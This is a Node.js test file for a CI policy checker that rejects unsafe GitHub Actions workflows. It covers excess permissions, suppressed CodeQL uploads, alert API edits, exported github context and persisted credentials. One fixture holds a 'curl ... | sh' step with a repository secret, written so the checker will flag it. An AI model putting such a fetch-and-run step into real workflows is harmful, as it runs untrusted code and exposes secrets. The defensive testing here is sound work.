import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import test from 'node:test'

function analyze(file, source) {
  const result = spawnSync('python3', ['.github/review/workflow-policy.py'], {
    encoding: 'utf8',
    input: JSON.stringify([{ file, source }]),
  })
  assert.equal(result.status, 0, result.stderr)
  return JSON.parse(result.stdout)
}

const workflow = (permissions, extra = '') => `
name: Source security
on: pull_request
permissions: {}
jobs:
  analyze:
    permissions:
${permissions}
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
        with:
          persist-credentials: false
      - uses: github/codeql-action/init@99df26d4f13ea111d4ec1a7dddef6063f76b97e9
        with:
          languages: javascript-typescript
          build-mode: none
          queries: security-extended
      - uses: github/codeql-action/analyze@99df26d4f13ea111d4ec1a7dddef6063f76b97e9
${extra}
`

test('allows only CodeQL result upload in the dedicated source-security job', () => {
  assert.deepEqual(
    analyze(
      '.github/workflows/source-security.yml',
      workflow('      actions: read\n      contents: read\n      security-events: write'),
    ),
    [],
  )
})

test('rejects source-security content or pull-request writes', () => {
  const findings = analyze(
    '.github/workflows/source-security.yml',
    workflow('      actions: read\n      contents: write\n      pull-requests: write\n      security-events: write'),
  )
  assert.equal(findings.length, 1)
  assert.match(findings[0], /contents, pull-requests, security-events/)
})

test('rejects CodeQL upload permission in every other workflow or scope', () => {
  assert.equal(
    analyze(
      '.github/workflows/untrusted.yml',
      workflow('      actions: read\n      contents: read\n      security-events: write'),
    ).length,
    1,
  )
  assert.equal(
    analyze(
      '.github/workflows/source-security.yml',
      `on: pull_request\npermissions:\n  security-events: write\njobs: {}`,
    ).length,
    1,
  )
})

test('rejects fake SARIF upload, alert API mutation, or CodeQL upload suppression', () => {
  const fakeUpload = workflow(
    '      actions: read\n      contents: read\n      security-events: write',
  ).replace(
    'github/codeql-action/analyze@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
    'github/codeql-action/upload-sarif@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', fakeUpload).length, 1)

  const apiMutation = workflow(
    '      actions: read\n      contents: read\n      security-events: write',
    '      - run: gh api repos/example/project/code-scanning/alerts/1 -X PATCH\n        env:\n          GH_TOKEN: \${{ github.token }}',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', apiMutation).length, 1)

  const noUpload = workflow(
    '      actions: read\n      contents: read\n      security-events: write',
  ).replace(
    '      - uses: github/codeql-action/analyze@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
    '      - uses: github/codeql-action/analyze@99df26d4f13ea111d4ec1a7dddef6063f76b97e9\n        with:\n          upload: false',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', noUpload).length, 1)
})

test('rejects every run step, github context export, and checkout credential persistence', () => {
  const permissions = '      actions: read\n      contents: read\n      security-events: write'
  assert.equal(
    analyze(
      '.github/workflows/source-security.yml',
      workflow(permissions, '      - run: echo harmless'),
    ).length,
    1,
  )

  const contextExport = workflow(permissions).replace(
    '    steps:',
    '    env:\n      CTX: \${{ toJSON(github) }}\n    steps:',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', contextExport).length, 1)

  const persisted = workflow(permissions).replace(
    '        with:\n          persist-credentials: false\n',
    '',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', persisted).length, 1)
})

test('continues to reject pull_request_target, secrets, and network-to-shell', () => {
  const findings = analyze(
    '.github/workflows/source-security.yml',
    `
on:
  pull_request:
  pull_request_target:
jobs:
  analyze:
    runs-on: ubuntu-24.04
    steps:
      - run: curl https://example.invalid/install | sh
        env:
          TOKEN: \${{ secrets.TOKEN }}
`,
  )
  assert.ok(findings.some((finding) => finding.includes('pull_request_target is forbidden')))
  assert.ok(findings.some((finding) => finding.includes('repository secrets')))
  assert.ok(findings.some((finding) => finding.includes('piping network content')))
})
